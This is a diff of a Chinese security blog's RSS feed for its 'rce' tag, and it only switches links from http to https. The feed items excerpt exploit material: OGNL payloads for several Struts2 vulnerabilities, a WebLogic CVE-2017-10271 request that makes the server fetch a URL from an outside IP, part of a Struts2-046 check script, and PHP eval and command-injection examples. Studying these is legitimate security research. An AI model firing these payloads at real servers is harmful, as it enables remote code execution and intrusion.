@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>rce on </title>
-    <link>http://wyb0.com/tags/rce/</link>
+    <link>https://wyb0.com/tags/rce/</link>
     <description>Recent content in rce on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Mon, 25 Jun 2018 21:26:14 +0800</lastBuildDate>
     
-	<atom:link href="http://wyb0.com/tags/rce/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://wyb0.com/tags/rce/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Struts 2相关漏洞payload</title>
-      <link>http://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
+      <link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
       <pubDate>Mon, 25 Jun 2018 21:26:14 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
+      <guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
       <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。  %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;quot;whoami&amp;quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  0x01 S2-005 影响版本: 2.0.0 - 2.1.8.1
 http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1  0x02 S2-007 影响版本: 2.0.0 - 2.2.3
 当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。  &#39; + (#_memberAccess[&amp;quot;allowStaticMethodAccess&amp;quot;]=true,#foo=new java.lang.Boolean(&amp;quot;false&amp;quot;) ,#context[&amp;quot;xwork.MethodAccessor.denyMethodExecution&amp;quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;  0x03 S2-012 影响版本: 2.1.0 - 2.3.13
@@ -25,10 +25,10 @@ http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAcce
     
     <item>
       <title>WebLogic 反序列化漏洞(CVE-2017-10271)</title>
-      <link>http://wyb0.com/posts/2018/cve-2017-10271/</link>
+      <link>https://wyb0.com/posts/2018/cve-2017-10271/</link>
       <pubDate>Fri, 09 Mar 2018 09:20:03 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2018/cve-2017-10271/</guid>
+      <guid>https://wyb0.com/posts/2018/cve-2017-10271/</guid>
       <description>0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
 漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
 0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt; &amp;lt;java version=&amp;quot;1.8&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt; &amp;lt;object id=&amp;quot;url&amp;quot; class=&amp;quot;java.net.URL&amp;quot;&amp;gt; &amp;lt;string&amp;gt;http://114.115.123.123:80/aaaaaaa&amp;lt;/string&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;object idref=&amp;quot;url&amp;quot;&amp;gt; &amp;lt;void id=&amp;quot;stream&amp;quot; method = &amp;quot;openStream&amp;quot; /&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.</description>
@@ -36,20 +36,20 @@ http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAcce
     
     <item>
       <title>Struts2-046 EXP</title>
-      <link>http://wyb0.com/posts/2017/struts2-046/</link>
+      <link>https://wyb0.com/posts/2017/struts2-046/</link>
       <pubDate>Sun, 16 Apr 2017 17:44:01 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2017/struts2-046/</guid>
+      <guid>https://wyb0.com/posts/2017/struts2-046/</guid>
       <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下：
 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,&#39;http://127.0.0.1:1080&#39;) return c def check(curl, url): head = [ &#39;Connection: close&#39;, &#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&#39; ] data = &#39;&#39;&#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;quot;foo&amp;quot;; filename=&amp;quot;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo dd996b71024fa97cd015f06a7f24ed30&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&#39;&#39;&#39; buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.setopt(pycurl.HTTPHEADER, head) curl.</description>
     </item>
     
     <item>
       <title>代码执行漏洞(二)</title>
-      <link>http://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
+      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
       <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
+      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
       <description> 接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
 string create_function ( string $args , string $code ) 其中$args是函数的参数，$code是函数的内容  若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞
 0x01 示例 示例a.php代码如下：
@@ -59,10 +59,10 @@ string create_function ( string $args , string $code ) 其中$args是函数的�
     
     <item>
       <title>代码执行漏洞(一)</title>
-      <link>http://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
+      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
       <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
+      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
       <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
 0x01 相关函数 PHP：eval assert Python：exec asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能  0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
 array( //这个是字符串形式的数组，它并不是数组，而是字符串 &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;, &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;, &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;, &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;, &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;, &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;, )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == &#39;&#39;) return array(); @eval(&amp;quot;\$array = $data;&amp;quot;); return $array; }  0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器  0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)  0x05 漏洞挖掘 框架找漏洞，如ThinkPHP： inurl:index.</description>
@@ -70,10 +70,10 @@ array( //这个是字符串形式的数组，它并不是数组，而是字符�
     
     <item>
       <title>命令执行漏洞</title>
-      <link>http://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
+      <link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
       <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
+      <guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
       <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。  0x01 利用条件  应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严  0x02 漏洞分类  代码层过滤不严
 商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
 system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;); 系统的漏洞造成命令执行
